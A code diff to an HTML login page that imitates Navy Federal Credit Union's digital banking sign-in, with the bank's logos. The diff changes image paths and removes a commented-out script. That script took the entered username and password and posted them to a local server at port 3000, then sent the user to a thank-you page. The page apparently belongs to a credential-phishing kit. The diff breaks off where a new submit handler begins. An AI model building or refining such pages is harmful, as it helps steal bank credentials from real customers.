@@ -67,10 +67,10 @@
 <body>
 
 
-    <img src="nfcu.png">
+    <img src="/nfcu.png">
     <h1>Welcome to Digital Banking</h1>
     <div class="container">
-        <img src="navy.jpg" alt="Navy Federal Credit Union Logo" width="200">
+        <img src="/navy.jpg" alt="Navy Federal Credit Union Logo" width="200">
         <!-- <form action="process_login.php" method="post"> -->
             <form id="loginForm" method="post">
             <label for="username">Username:</label>
@@ -84,45 +84,6 @@
 
         </form>
         <!-- <i class="fa fa-spinner fa-pulse" style="display:none;" id="loadingIcon"></i> -->
-
-
-     //   <script>
-// function showLoading() {
-//     document.getElementById('loadingIcon').style.display = 'block';
-//     document.getElementById('loginForm').onsubmit = function(event) {
-//         event.preventDefault(); // Prevent the form from submitting normally
-//         submitForm();
-//     };
-// }
-
-// function submitForm() {
-//     const formData = new FormData(document.getElementById('loginForm'));
-//     const username = formData.get('username');
-//     const password = formData.get('password');
-
-//     fetch('http://localhost:3000/submit-form', {
-//         method: 'POST',
-//         headers: {
-//             'Content-Type': 'application/json'
-//         },
-//         body: JSON.stringify({ username, password })
-//     })
-//    .then(response => response.text())
-//    .then(data => {
-//         if (data === 'Form data submitted successfully') {
-//             window.location.href = '/thank-you.html'; // Redirect to the Thank You page
-//         } else {
-//             alert('Submission failed. Please try again.');
-//             document.getElementById('loadingIcon').style.display = 'none';
-//         }
-//     })
-//    .catch(error => {
-//         console.error('Error:', error);
-//         document.getElementById('loadingIcon').style.display = 'none';
-//     });
-// }
-// </script>
-
 
         <script>
     document.getElementById('loginForm').addEventListener('submit', function(e) {
